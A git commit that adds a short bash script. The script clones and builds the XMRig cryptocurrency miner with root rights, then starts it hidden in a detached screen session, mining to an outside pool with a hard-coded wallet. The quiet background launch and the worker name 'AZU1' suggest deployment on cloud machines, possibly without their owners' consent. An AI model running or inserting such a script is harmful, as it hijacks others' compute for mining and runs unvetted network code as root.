677b9b1c128bae300ae845a0f7b4665dfc6dd501
Velvettax <amad.motzart@gmail.com>
2020-09-13 22:59:21 +0200

    Create a.sh

---
+++ a.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+sudo git clone https://github.com/xmrig/xmrig.git
+cd xmrig
+sudo mkdir build
+cd build
+sudo cmake .. -DCUDA_ENABLE=OFF
+sudo cmake .. -DOpenCL_ENABLE=OFF
+sudo cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7
+sudo make -j$(nproc)
+sudo su
+script /dev/null
+sudo su ubuntu
+cd xmrig/build
+screen -dm sudo ./xmrig --donate-level 1 -o loki.herominers.com:10111 -u L9yvFcwDHEjjZvnn1YFTQeiERwUzZ1NP369EVaqdry1zWvwy55z34JnekaAhT5RaPC4cbKi5iveVbdDmrFwyAbwcSuhcsyy -p AZU1 -k -a rx/loki
